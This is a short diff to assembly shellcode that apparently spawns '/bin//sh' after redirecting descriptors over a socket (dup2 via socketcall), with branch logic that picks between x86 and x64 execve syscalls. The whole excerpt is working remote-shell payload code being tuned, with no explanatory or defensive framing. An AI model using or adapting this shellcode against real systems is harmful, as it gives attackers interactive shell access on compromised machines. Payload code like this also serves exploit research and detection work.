@@ -122,7 +122,7 @@ x86_dup2:
     mov     al, 102     ; eax = sys_socketcall    
     int     0x80
     
-x84_execve:    
+x84_execve:
     cdq                 ; edx = 0
     push    eax         ; '\0'
     push    eax         ; null space
@@ -133,13 +133,13 @@ x84_execve:
     pop     edi         ; rdi = "/bin//sh", 0
     mov     dword[edi+0], '/bin'
     mov     dword[edi+4], '//sh'
-    inc     eax
-    jnz     x86_execve
+    dec     eax
+    js      x86_execve
     mov     al, 59      ; rax = sys_execve
     syscall
 x86_execve:
     xor     ecx, ecx    ; argv = NULL
-    mov     al, 11      ; eax  = sys_execve
+    add     al, 12      ; eax  = sys_execve
     int     0x80
     
     
